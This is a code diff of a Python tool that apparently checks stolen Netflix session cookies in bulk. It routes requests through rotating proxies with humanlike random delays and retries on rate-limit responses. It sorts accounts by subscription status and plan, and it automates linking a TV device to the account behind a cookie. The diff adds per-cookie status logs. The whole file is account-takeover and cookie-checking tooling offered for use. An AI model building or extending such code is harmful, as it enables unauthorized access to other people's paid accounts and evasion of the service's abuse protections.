@@ -26,21 +26,17 @@ def _build_proxy_dict(scheme, host, port, user=None, password=None):
     return {"http": proxy_url, "https": proxy_url}
 
 def _parse_proxy_line(line):
-    # 1. Aggressively strip invisible Windows characters (BOM) & control bytes
     line = line.strip().lstrip('\ufeff').lstrip('\u200b')
     line = re.sub(r'[\x00-\x1F\x7F-\x9F]', '', line)
     if not line or line.startswith("#"): return None
     
-    # 2. Native URL Fallback (Perfect for http://user:pass@host:port)
     if "://" in line:
         try:
             p = urlparse(line)
             if p.hostname and p.port:
                 return _build_proxy_dict(p.scheme or "http", p.hostname, p.port, p.username, p.password)
-        except:
-            pass
+        except: pass
 
-    # 3. Standard Regex Parsing
     line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
     line = re.sub(r"\s+", " ", line).strip()
     
@@ -101,57 +97,40 @@ def parse_proxies_from_bytes(file_bytes: bytes) -> list:
         for line in text_content.splitlines():
             proxy = _parse_proxy_line(line)
             if proxy: proxies.append(proxy)
-    except Exception:
-        pass
+    except Exception: pass
     return proxies
 
-# --- UPGRADED ROBUST IP CHECKER FOR WEBSHARE ---
 def get_public_ip(proxies):
     local_ip = "Unknown"
     try:
-        # Plain text request -> NO JSON to decode, making JSONDecodeError impossible
         resp = requests.get("https://api.ipify.org", timeout=5)
-        if resp.status_code == 200:
-            local_ip = resp.text.strip()
-    except: 
-        local_ip = "Unable to verify (Network Error)"
+        if resp.status_code == 200: local_ip = resp.text.strip()
+    except: local_ip = "Unable to verify (Network Error)"
     
     proxy_info = f"Proxies loaded: {len(proxies)}" if proxies else "No proxies used."
-    
     if proxies:
         success = False
         last_err = ""
-        
-        # Test up to 3 proxies to bypass any temporary Webshare dead-zones
         test_pool = random.sample(proxies, min(3, len(proxies)))
         
         for test_proxy in test_pool:
             try:
-                # HTTPS prevents proxy injection, plain text prevents JSON errors
                 p_resp = requests.get("https://api.ipify.org", proxies=test_proxy, timeout=15)
-                
                 if p_resp.status_code == 200:
                     ip_str = p_resp.text.strip()
-                    # Ensure we actually got an IP address, not an HTML block page
                     if "." in ip_str and len(ip_str) < 20:
                         proxy_info += f" | Proxy Verified IP: {ip_str}"
                         success = True
                         break
-                    else:
-                        last_err = "HTML Intercept"
-                else:
-                    last_err = f"HTTP {p_resp.status_code}"
-                    
+                    else: last_err = "HTML Intercept"
+                else: last_err = f"HTTP {p_resp.status_code}"
             except Exception as e:
                 last_err = type(e).__name__
                 continue
                 
-        if not success:
-            proxy_info += f" | Proxy Verification: Failed ({last_err})"
+        if not success: proxy_info += f" | Proxy Verification: Failed ({last_err})"
             
     return local_ip, proxy_info
-
-
 
 # ==========================================
 # --- FLAWLESS COOKIE EXTRACTOR ---
@@ -262,9 +241,6 @@ def analyze_plan_and_language(raw_plan):
         if normalized == key or key in normalized: return data[0], data[1]
     return raw_plan.title(), f"Original: {raw_plan}"
 
-# ==========================================
-# --- EXACT EXTRACTION LOGIC ---
-# ==========================================
 def perform_extraction(html: str, original_id: str, processed_guids: set, guid_lock: threading.Lock):
     gql_obj = find_object_after_marker(html, '"graphql":')
     rc_obj = find_object_after_marker(html, "netflix.reactContext")
@@ -356,13 +332,12 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
     return "\n".join(out), canonical_plan, quality, is_subscribed, is_on_hold, db_data
 
 # ==========================================
-# --- EXACT THREAD WORKER WITH API HOOK ---
+# --- EXACT THREAD WORKER WITH DETAILED LOGS ---
 # ==========================================
-def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None, delete_callback=None):
+def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None, delete_callback=None, detailed_logs=None):
     max_retries = 3 
     retryable_status_codes = {403, 429, 500, 502, 503, 504}
     
-    # Thread-specific short-term memory to prevent repeating proxies
     last_proxy = None 
 
     while True:
@@ -374,27 +349,28 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
             q.task_done()
             continue
 
-        # --- HUMANIZED JITTER ---
-        # Pauses the thread for a random time between 0.4 and 1.2 seconds
         time.sleep(random.uniform(0.4, 1.2))
 
         success = False
+        status_for_log = "ERROR"
+        proxy_host_for_log = "DIRECT IP"
 
         for attempt in range(max_retries):
-            # --- SMART PROXY SELECTION LOGIC ---
             proxy = None
             if proxies:
                 if len(proxies) > 1:
-                    # Filter out the proxy we just used
                     valid_proxies = [p for p in proxies if p != last_proxy]
-                    # If valid_proxies is empty (rare edge case), fallback to the original list
                     proxy = random.choice(valid_proxies) if valid_proxies else proxies[0]
                 else:
-                    # If there's only 1 proxy in the entire file, we have to use it
                     proxy = proxies[0]
-                
-                # Remember this proxy for the next loop
                 last_proxy = proxy
+                
+                # Extract clean IP/Host for the Log file (hides your proxy user/pass)
+                try:
+                    p_url = urlparse(proxy['http'])
+                    proxy_host_for_log = p_url.hostname
+                except:
+                    proxy_host_for_log = "PROXY"
 
             try:
                 session = requests.Session()
@@ -407,12 +383,12 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                 response = session.get('https://www.netflix.com/YourAccount', allow_redirects=True, proxies=proxy, timeout=15)
                 
                 if response.status_code in retryable_status_codes:
+                    status_for_log = f"RETRY ({response.status_code})"
                     continue 
 
                 if "login" in response.url.lower():
-                    with print_lock:
-                        stats["dead"] += 1
-                    # Delete if Dead
+                    status_for_log = "DEAD"
+                    with print_lock: stats["dead"] += 1
                     if delete_callback: delete_callback(clean_id)
                         
                 elif '"graphql":' in response.text:
@@ -422,50 +398,54 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                     
                     with print_lock:
                         if result_text == "DUPLICATE":
+                            status_for_log = "DUPL"
                             stats["duplicates"] += 1
                         elif result_text == "ERROR":
+                            status_for_log = "ERROR"
                             stats["errors"] += 1
                         else:
                             if is_on_hold: 
+                                status_for_log = "HOLD"
                                 stats["holds"] += 1
-                                # Delete if On Hold
                                 if delete_callback: delete_callback(clean_id)
                                 
-                            if is_subscribed:
+                            elif is_subscribed:
+                                status_for_log = "HIT"
                                 stats["hits"] += 1
                                 stats["qualities"][quality] = stats["qualities"].get(quality, 0) + 1
                                 stats["plans"][plan_name] = stats["plans"].get(plan_name, 0) + 1
-                                
-                                if not is_on_hold and db_callback:
-                                    db_callback(db_data)
+                                if db_callback: db_callback(db_data)
                             else:
+                                status_for_log = "FREE"
                                 stats["free"] += 1
-                                # Delete if Free
                                 if delete_callback: delete_callback(clean_id)
                 else:
-                    with print_lock:
-                        stats["unknown"] += 1
+                    status_for_log = "UNKNOWN"
+                    with print_lock: stats["unknown"] += 1
                 
                 success = True
                 break 
 
-            except (requests.exceptions.ProxyError, requests.RequestException):
+            except (requests.exceptions.ProxyError, requests.RequestException) as e:
+                status_for_log = f"ERROR ({type(e).__name__})"
                 continue 
 
         if not success:
+            status_for_log = "FAILED"
             with print_lock:
                 stats["errors"] += 1
 
+        # Save to Detailed Log
+        if detailed_logs is not None:
+            with print_lock:
+                detailed_logs.append(f"[{status_for_log.ljust(6)}] ID: {clean_id[:25]:<25}... | Proxy: {proxy_host_for_log}")
+
         q.task_done()
 
-# ==========================================
-# --- DEEP AUTH URL EXTRACTORS ---
-# ==========================================
 def _deep_find_key(obj, target_key):
     if isinstance(obj, dict):
         for key, value in obj.items():
-            if key == target_key and value:
-                return value
+            if key == target_key and value: return value
             result = _deep_find_key(value, target_key)
             if result: return result
     elif isinstance(obj, list):
@@ -482,8 +462,7 @@ def find_auth_in_react_context(html):
     for pattern in patterns:
         m = re.search(pattern, html, re.DOTALL)
         if not m: continue
-        try:
-            context = json.loads(m.group(1))
+        try: context = json.loads(m.group(1))
         except json.JSONDecodeError: continue
         auth = _deep_find_key(context, "authURL")
         if auth: return auth
@@ -502,36 +481,19 @@ def find_auth_in_html(html):
         if m: return unquote(m.group(1))
     return None
 
-# ==========================================
-# --- ROBUST DYNAMIC TV AUTOMATION ---
-# ==========================================
 def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tuple:
     clean_id = netflix_id.replace("NetflixId=", "").strip()
     session = requests.Session()
     
     headers = {
         "authority":                  "www.netflix.com",
-        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
         "accept-language":            "en-US,en;q=0.9",
-        "cache-control":              "max-age=0",
-        "sec-ch-ua":                  '"Chromium";v="137", "Not/A)Brand";v="24"',
-        "sec-ch-ua-mobile":           "?0",
-        "sec-ch-ua-model":            '""',
-        "sec-ch-ua-platform":         '"Linux"',
-        "sec-ch-ua-platform-version": '""',
-        "sec-fetch-dest":             "document",
-        "sec-fetch-mode":             "navigate",
-        "sec-fetch-site":             "same-origin",
-        "sec-fetch-user":             "?1",
-        "upgrade-insecure-requests":  "1",
         "user-agent":                 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
     }
     
     session.headers.update(headers)
     session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
-    
-    # TV Auth executes serially, so simple random.choice is fine here to maintain
-    # a continuous session through the 3 API calls
     proxy = random.choice(proxies) if proxies else None
 
     try:
@@ -540,13 +502,11 @@ def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tu
         refreshed_cookie_string = f"NetflixId={refreshed_id}"
 
         res_tv8 = session.get("https://www.netflix.com/tv8", proxies=proxy, timeout=15)
-        
         auth_url = find_auth_in_react_context(res_tv8.text)
-        if not auth_url:
-            auth_url = find_auth_in_html(res_tv8.text)
+        if not auth_url: auth_url = find_auth_in_html(res_tv8.text)
             
         if not auth_url:
-            return False, "Failed to extract dynamic authURL. The cookie session may be expired or invalid.", refreshed_cookie_string
+            return False, "Failed to extract dynamic authURL.", refreshed_cookie_string
 
         post_data = {
             "flow":                  "websiteSignUp",
@@ -565,15 +525,7 @@ def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tu
             "referer":      "https://www.netflix.com/tv8",
         })
 
-        res_post = session.post(
-            "https://www.netflix.com/tv8",
-            headers=post_headers,
-            data=post_data,
-            proxies=proxy,
-            timeout=15,
-            allow_redirects=True
-        )
-        
+        res_post = session.post("https://www.netflix.com/tv8", headers=post_headers, data=post_data, proxies=proxy, timeout=15, allow_redirects=True)
         final_url = res_post.url.rstrip('/').split('?')[0].lower()
         
         if final_url == "https://www.netflix.com/tv/out/success":
